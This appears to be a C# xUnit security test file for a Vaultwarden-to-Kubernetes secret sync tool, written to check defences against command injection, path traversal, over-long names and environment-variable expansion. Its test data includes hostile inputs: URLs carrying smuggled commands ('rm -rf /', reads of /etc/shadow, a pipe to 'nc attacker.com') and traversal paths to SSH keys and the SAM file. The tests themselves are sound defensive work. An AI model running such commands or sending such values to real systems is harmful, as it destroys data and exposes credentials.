using Xunit;
using Moq;
using FluentAssertions;
using Microsoft.Extensions.Logging;
using VaultwardenK8sSync.Services;
using VaultwardenK8sSync.Configuration;
using VaultwardenK8sSync.Infrastructure;
using VaultwardenK8sSync.Models;

namespace VaultwardenK8sSync.Tests.Security;

/// <summary>
/// Tests to prevent command injection through ServerUrl and other inputs
/// </summary>
[Collection("SyncService Sequential")]
public class CommandInjectionTests
{
    [Theory]
    [InlineData("https://evil.com; rm -rf /")]
    [InlineData("https://evil.com`whoami`")]
    [InlineData("https://evil.com$(cat /etc/passwd)")]
    [InlineData("https://evil.com\nrm -rf /")]
    [InlineData("https://evil.com&& cat /etc/shadow")]
    [InlineData("https://evil.com | nc attacker.com 1234")]
    [InlineData("https://evil.com'$(reboot)'")]
    [InlineData("https://evil.com;echo hacked>~/pwned.txt")]
    public void ServerUrl_ShouldNotContainDangerousCharacters(string maliciousUrl)
    {
        // Arrange - Test that URL validation would catch these
        var dangerous = new[] { ";", "`", "$", "&", "|", "\n", "\r", "'" };
        
        // Act & Assert - URL should contain at least one dangerous character
        var containsDangerous = dangerous.Any(maliciousUrl.Contains);
        
        // This test documents that these URLs are dangerous
        // Implementation should validate and reject them
        Assert.True(containsDangerous, 
            $"URL should be flagged as dangerous: {maliciousUrl}");
    }
    
    [Theory]
    [InlineData("../../etc/passwd")]
    [InlineData("../../../root/.ssh/id_rsa")]
    [InlineData("/etc/shadow")]
    [InlineData("C:\\Windows\\System32\\config\\SAM")]
    public void SecretName_ShouldPreventPathTraversal(string maliciousName)
    {
        // Arrange
        var item = new VaultwardenItem
        {
            Id = "test",
            Name = maliciousName,
            Type = 1,
            Login = new LoginInfo { Username = "user", Password = "pass" },
            Fields = new List<FieldInfo>
            {
                new() { Name = "namespaces", Value = "default", Type = 0 }
            }
        };
        
        // Act
        var secretName = item.ExtractSecretName();
        
        // Assert - Should either sanitize to valid name OR return null
        if (secretName != null)
        {
            secretName.Should().NotContain("..");
            secretName.Should().NotContain("/");
            secretName.Should().NotContain("\\");
            secretName.Should().MatchRegex(@"^[a-z0-9]([-a-z0-9]*[a-z0-9])?$", 
                "Secret name must be valid Kubernetes DNS subdomain");
        }
        // Null is acceptable - means the name was rejected/couldn't be sanitized
    }
    
    [Fact]
    public async Task SecretName_ShouldEnforceMaximumLength()
    {
        // K8s secret names limited to 253 characters
        var longName = new string('a', 300);
        
        var item = new VaultwardenItem
        {
            Id = "test",
            Name = longName,
            Type = 1,
            Login = new LoginInfo { Username = "user", Password = "pass" },
            Fields = new List<FieldInfo>
            {
                new() { Name = "namespaces", Value = "default", Type = 0 }
            }
        };
        
        // Arrange - Create sync service to test full sanitization flow
        var mockLogger = new Mock<ILogger<SyncService>>();
        var mockVaultwardenService = new Mock<IVaultwardenService>();
        var mockKubernetesService = new Mock<IKubernetesService>();
        var mockMetrics = new Mock<IMetricsService>();
        var mockDbLogger = new Mock<IDatabaseLoggerService>();
        var syncConfig = new SyncSettings();
        
        mockVaultwardenService.Setup(x => x.GetItemsAsync())
            .ReturnsAsync(new List<VaultwardenItem> { item });
        mockKubernetesService.Setup(x => x.GetAllNamespacesAsync())
            .ReturnsAsync(new List<string> { "default" });
        mockDbLogger.Setup(x => x.StartSyncLogAsync(It.IsAny<string>(), It.IsAny<int>(), It.IsAny<int>(), It.IsAny<bool>()))
            .ReturnsAsync(1L);
        mockDbLogger.Setup(x => x.CleanupStaleSecretStatesAsync(It.IsAny<List<VaultwardenItem>>()))
            .ReturnsAsync(0);
        
        string? capturedSecretName = null;
        mockKubernetesService.Setup(x => x.SecretExistsAsync(It.IsAny<string>(), It.IsAny<string>()))
            .Callback<string, string>((ns, name) => capturedSecretName = name)
            .ReturnsAsync(false);
        
        var syncService = new SyncService(
            mockLogger.Object,
            mockVaultwardenService.Object,
            mockKubernetesService.Object,
            mockMetrics.Object,
            mockDbLogger.Object,
            syncConfig
        );
        
        // Act - Run sync which will sanitize and truncate the name
        await syncService.SyncAsync();
        
        // Assert - Captured secret name should be truncated to 253 characters
        capturedSecretName.Should().NotBeNull();
        capturedSecretName!.Length.Should().BeLessOrEqualTo(253, 
            "Kubernetes secret names cannot exceed 253 characters");
    }
    
    [Theory]
    [InlineData("${EVIL_ENV_VAR}")]
    [InlineData("$PATH")]
    [InlineData("$(whoami)")]
    [InlineData("`whoami`")]
    public void SecretValues_ShouldNotExpandEnvironmentVariables(string maliciousValue)
    {
        // Arrange
        var item = new VaultwardenItem
        {
            Id = "test",
            Name = "test-secret",
            Type = 1,
            Login = new LoginInfo 
            { 
                Username = maliciousValue,
                Password = maliciousValue
            },
            Fields = new List<FieldInfo>
            {
                new() { Name = "namespaces", Value = "default", Type = 0 },
                new() { Name = "custom-field", Value = maliciousValue, Type = 0 }
            }
        };
        
        // Act - Get username and password
        var username = item.Login?.Username;
        var password = item.Login?.Password;
        
        // Assert - Values should be stored exactly as-is, not expanded
        Assert.NotNull(username);
        Assert.NotNull(password);
        Assert.Equal(maliciousValue, username);
        Assert.Equal(maliciousValue, password);
    }
}
